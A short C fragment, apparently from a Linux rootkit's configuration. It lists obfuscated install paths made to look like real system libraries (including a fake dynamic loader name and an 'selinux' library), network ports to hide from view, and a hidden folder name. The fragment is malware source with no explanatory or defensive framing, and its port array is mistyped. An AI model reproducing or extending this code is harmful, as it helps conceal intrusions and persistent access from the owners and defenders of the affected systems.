char* INSTALL_LOCATIONS[] = {
				AY_OBFUSCATE("/lib/libhtsjava.so.3"), 
			  AY_OBFUSCATE("/lib/libsgx_urts.so.1.1"), 
				AY_OBFUSCATE("/lib/libogdi.so.4.1"), 
				AY_OBFUSCATE("/lib64/ld-linux-x86-64.so.3"), 
				AY_OBFUSCATE("/lib/selinux.so.1.1.2")
			    };
int* HIDDEN_PORTS[]       = {1337, 1338};
char* HIDDEN_FOLDERS[]    = {AY_OBFUSCATE("jakhid")};
